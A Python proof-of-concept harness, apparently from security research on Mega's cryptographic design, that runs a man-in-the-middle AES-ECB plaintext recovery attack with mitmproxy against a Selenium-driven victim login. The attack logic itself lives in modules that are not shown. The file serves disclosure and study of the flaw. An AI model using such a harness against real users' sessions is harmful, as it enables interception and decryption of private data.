
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC for MitM AES-ECB plaintext recovery attack using mitmproxy
# and a victim automated with a Selenium browser.
#

from shared.constants.victim import *
from shared.constants.mitmproxy import *
from shared.victim import *
from shared.mitmproxy import *

class PoCMitmAesEcbPlaintextRecovery:
    def __init__(self):
        print("# Initialize MitM AES-ECB Plaintext Recovery PoC")

    def run_attack(self):
        print("## Starting MitM attack")

        print("### Starting mitmproxy")
        mitmproxy = Mitmproxy("issue_02/poc_mitmproxy.py")
        mitmproxy.start()

        print("### Starting the victim process")
        victim = Victim(VICTIM_UNAME)

        print(f"### The attack is running, check '{MITMPROXY_LOG_FILE}' for intermediate results.")

        victim.login()

        if mitmproxy.wait() and mitmproxy.is_done():
            print("### Attack successful!")
        else:
            print("### Attack failed!")

        mitmproxy.exit()
        victim.exit()
